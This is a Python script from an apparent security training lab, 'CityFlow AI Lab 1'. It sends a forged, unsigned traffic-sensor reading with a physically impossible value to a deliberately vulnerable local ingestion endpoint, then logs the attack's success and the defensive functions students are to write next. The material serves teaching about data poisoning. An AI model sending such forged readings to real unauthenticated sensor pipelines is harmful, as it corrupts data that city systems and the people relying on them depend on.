"""
poison_data.py - CityFlow AI Lab 1: isolated data poisoning attack

This script runs entirely inside the Lab 1 container. It attacks the local
vulnerable node at 127.0.0.1:5000 and does not call the backend pipeline.
"""

from datetime import datetime, timezone
from pathlib import Path

import requests


LOG_PATH = Path("/home/lab/output/lab1-attack.log")
TARGET_URL = "http://127.0.0.1:5000/ingest"


def write_lines(lines):
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
    text = "\n".join(lines)
    print(text)
    with LOG_PATH.open("a", encoding="utf-8") as handle:
        handle.write(text)
        handle.write("\n")


def run_attack():
    now = datetime.now(timezone.utc).isoformat()
    poisoned_reading = {
        "sensor_id": "cam_north_01",
        "date_time": "2016-12-08 08:00:00",
        "traffic_volume": -5000,
        "temp": 0.0,
        "source": "unauthenticated_mqtt",
        "signed": False,
    }

    try:
        response = requests.post(TARGET_URL, json=poisoned_reading, timeout=5)
        response.raise_for_status()
        result = response.json()
    except requests.RequestException as exc:
        lines = [
            "",
            "=" * 62,
            "  CityFlow AI - MQTT_INJECTOR.PY",
            "  Lab 1: Isolated Data Poisoning Attack",
            "=" * 62,
            f"[LAB] container=lab-phase-1 timestamp={now}",
            f"[ERROR] Could not reach local vulnerable target: {TARGET_URL}",
            f"[ERROR] {exc}",
            "[FIX] Check that vulnerable_app.py is running inside the Lab 1 VM.",
            "=" * 62,
            "",
        ]
        write_lines(lines)
        raise SystemExit(1) from exc

    lines = [
        "",
        "=" * 62,
        "  CityFlow AI - MQTT_INJECTOR.PY",
        "  Lab 1: Isolated Data Poisoning Attack",
        "=" * 62,
        f"[LAB] container=lab-phase-1 timestamp={now}",
        "[ISOLATION] Running inside the Lab 1 container only.",
        "[ISOLATION] No backend pipeline endpoint was called.",
        "",
        f"[*] Opening local unauthenticated ingestion socket: {TARGET_URL}",
        "[*] No token, signature, or device identity required.",
        "",
        "[*] Sending forged reading:",
        f"    sensor_id      = {poisoned_reading['sensor_id']}",
        f"    date_time      = {poisoned_reading['date_time']}",
        f"    traffic_volume = {poisoned_reading['traffic_volume']}  <- physically impossible",
        f"    temp           = {poisoned_reading['temp']} K",
        f"    signed         = {poisoned_reading['signed']}",
        "",
        f"[TARGET] HTTP {response.status_code}",
        f"[TARGET] accepted={result.get('accepted')} reason={result.get('reason')}",
        f"[TARGET] forwarded={result.get('forwarded')} dropped={result.get('dropped')}",
        f"[TARGET] congestion_score={result.get('congestion_score')}",
        "",
        "[RESULT] ATTACK SUCCESSFUL inside isolated lab runtime.",
        "[NEXT] Implement validate_reading(), detect_anomaly(), and evaluar_drift().",
        "=" * 62,
        "",
    ]
    write_lines(lines)


if __name__ == "__main__":
    run_attack()
